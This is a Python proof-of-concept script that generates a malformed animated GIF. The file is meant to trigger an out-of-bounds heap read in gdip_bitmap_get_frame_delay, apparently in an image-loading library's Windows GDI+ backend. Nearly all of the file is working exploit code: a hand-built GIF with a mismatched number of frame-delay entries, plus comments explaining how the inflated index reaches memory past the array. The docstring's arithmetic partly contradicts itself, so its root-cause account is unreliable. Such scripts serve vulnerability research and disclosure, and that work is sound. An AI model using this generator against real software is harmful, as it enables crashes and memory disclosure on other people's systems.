#!/usr/bin/env python3
"""
PoC Generator for VULN 001:
  OOB Heap Read in gdip_bitmap_get_frame_delay via Inflated item_count

Target: gdip_bitmap_get_frame_delay() in io-gdip-utils.c, line 491-498
CWE:    CWE-125 (Out-of-bounds Read)

Vulnerability root cause:
  item_count = item_size / sizeof(long)
  item_size returned by GdipGetPropertyItemSize() includes the PropertyItem
  header (typically 16 bytes on 32-bit, 24 bytes on 64-bit), not just the
  delay data array. Dividing the *total* buffer size by sizeof(long) inflates
  item_count by sizeof(PropertyItem)/sizeof(long) = 4 extra entries (on 64-bit:
  24/8 = 3; on 32-bit: 16/4 = 4). When the GIF has more frames than actual
  delay entries, the loop reads beyond the allocated delay data into the
  PropertyItem header region or beyond.

Crafted GIF strategy:
  - Animate GIF with N frames where N > number of Graphic Control Extensions
  - The last frame intentionally lacks a GCE, so GDI+ stores fewer delay
    entries than frames, causing gdip_bitmap_get_frame_delay() to use the
    OOB'd (inflated) item_count-1 index on the final frame.

NOTE: This PoC targets the Windows GDI+ backend (io-gdip-gif.c).
      On Linux the GDI+ backend is not compiled in, so this code path
      cannot be reached. See vuln_001_status.txt for platform check result.
"""

import struct
import sys

OUTPUT_FILE = "vuln_001.gif"

def lzw_compress_minimal(data_bytes, min_code_size=2):
    """Produce a minimal (single-block) LZW-compressed payload for small images."""
    # For a 1x1 pixel image with color index 0, use a pre-built minimal stream.
    # min_code_size=2 means codes are at least 3 bits wide.
    # Clear code = 4, EOI code = 5.
    # Sequence: CLEAR, 0 (pixel), EOI  -> pack into bytes.
    # bits: 100 000 101  (CLEAR=4, pixel=0, EOI=5) with 3-bit codes
    # byte 0: bits 2..0 = CLEAR[0..2] = 100 -> 0x04 (bits stored LSB first)
    # Actually let's just hand-encode a known-good stream.
    # min_code_size byte + sub-block(s) + block terminator
    stream = bytes([
        min_code_size,  # LZW minimum code size
        0x02,           # sub-block length = 2 bytes
        0x4C,           # 0b01001100 : CLEAR(4)=100, pixel(0)=000, partial EOI
        0x01,           # 0b00000001 : EOI(5) high bits = 001
        0x00,           # block terminator
    ])
    return stream

def gif_header(width, height, num_colors=4):
    """GIF89a header + Logical Screen Descriptor + Global Color Table."""
    buf = b"GIF89a"
    # Logical Screen Descriptor
    packed = 0b10000001  # GCT present, color depth=2 bits -> 4 colors
    buf += struct.pack("<HHBBB", width, height, packed, 0, 0)
    # Global Color Table: 4 entries of RGB
    gct = (
        b"\x00\x00\x00"  # 0: black
        b"\xFF\xFF\xFF"  # 1: white
        b"\xFF\x00\x00"  # 2: red
        b"\x00\xFF\x00"  # 3: green
    )
    buf += gct
    return buf

def netscape_extension():
    """Application Extension: NETSCAPE2.0 for animation loop."""
    buf = b"\x21\xFF"   # Extension Introducer + Application Extension label
    buf += b"\x0B"      # Block size = 11
    buf += b"NETSCAPE2.0"
    buf += b"\x03"      # Sub-block length = 3
    buf += b"\x01"      # Sub-block ID
    buf += struct.pack("<H", 0)  # Loop count 0 = infinite
    buf += b"\x00"      # Block terminator
    return buf

def graphic_control_extension(delay_cs=10, disposal=0):
    """Graphic Control Extension (4 bytes: packed, delay, transparent idx)."""
    # delay_cs: delay in centiseconds
    buf = b"\x21\xF9"   # Extension Introducer + Graphic Control label
    buf += b"\x04"      # Block size = 4
    packed = (disposal & 0x07) << 3
    buf += struct.pack("<B", packed)
    buf += struct.pack("<H", delay_cs)  # delay
    buf += b"\x00"      # transparent color index (not used)
    buf += b"\x00"      # block terminator
    return buf

def image_descriptor(left=0, top=0, width=1, height=1, local_ct=False):
    """Image Descriptor block."""
    buf = b"\x2C"
    packed = 0x80 if local_ct else 0x00
    buf += struct.pack("<HHHHB", left, top, width, height, packed)
    return buf

def image_data():
    """Minimal LZW image data for a 1x1 pixel image."""
    return lzw_compress_minimal(b"\x00")

def gif_trailer():
    return b"\x3B"

def build_poc_gif(num_frames_with_gce=3, num_frames_without_gce=2):
    """
    Build an animated GIF with:
      - num_frames_with_gce frames that have a preceding GCE
      - num_frames_without_gce frames that do NOT have a GCE

    When GDI+ parses this and calls GdipGetPropertyItemSize for
    PropertyTagFrameDelay, item_size will reflect only the frames that had
    GCE delay values stored (num_frames_with_gce entries * sizeof(long)).
    However item_count is computed as item_size / sizeof(long) including the
    PropertyItem header bytes, so item_count > num_frames_with_gce.
    When the loader iterates over all (num_frames_with_gce + num_frames_without_gce)
    frames and calls gdip_bitmap_get_frame_delay(bitmap, frame_idx, &delay)
    for the last frame, frame_idx may equal item_count-1 which indexes into
    header bytes beyond the actual data array.
    """
    total_frames = num_frames_with_gce + num_frames_without_gce
    print(f"[*] Building GIF with {total_frames} total frames")
    print(f"    - {num_frames_with_gce} frames WITH GCE (have delay entries)")
    print(f"    - {num_frames_without_gce} frames WITHOUT GCE (no delay entries)")
    print(f"    Target: item_count inflated by header / sizeof(long) extra entries")

    buf = gif_header(width=1, height=1)
    buf += netscape_extension()

    # Frames with GCE
    for i in range(num_frames_with_gce):
        buf += graphic_control_extension(delay_cs=10 * (i + 1))
        buf += image_descriptor()
        buf += image_data()

    # Frames WITHOUT GCE — GDI+ stores no delay for these, but the loader
    # still calls gdip_bitmap_get_frame_delay() for each frame index.
    for i in range(num_frames_without_gce):
        buf += image_descriptor()
        buf += image_data()

    buf += gif_trailer()
    return buf

def main():
    # Use enough frames to ensure the last GCE-less frame index exceeds the
    # actual stored delay count.  With sizeof(PropertyItem)=24 on 64-bit and
    # sizeof(long)=8, header contributes 3 phantom entries.  With
    # sizeof(PropertyItem)=16 on 32-bit and sizeof(long)=4, header contributes
    # 4 phantom entries.
    # Strategy: 4 frames with GCE, 2 without.  Last frame index = 5.
    # item_size = sizeof(PropertyItem) + 4*sizeof(long)
    # item_count = (sizeof(PropertyItem) + 4*sizeof(long)) / sizeof(long)
    #            = sizeof(PropertyItem)/sizeof(long) + 4  (3 or 4 extra)
    # So item_count becomes 7 or 8.  The OOB access happens at index 5 which
    # is ≤ item_count-1, so the condition (frame < item_count) is true and
    # the read uses index 5 (into bytes beyond the 4 actual long values).
    data = build_poc_gif(num_frames_with_gce=4, num_frames_without_gce=2)
    with open(OUTPUT_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTPUT_FILE}")
    # Print hex dump of first 64 bytes for verification
    print("[*] First 64 bytes (hex):")
    hex_str = " ".join(f"{b:02X}" for b in data[:64])
    print("   ", hex_str)

if __name__ == "__main__":
    main()
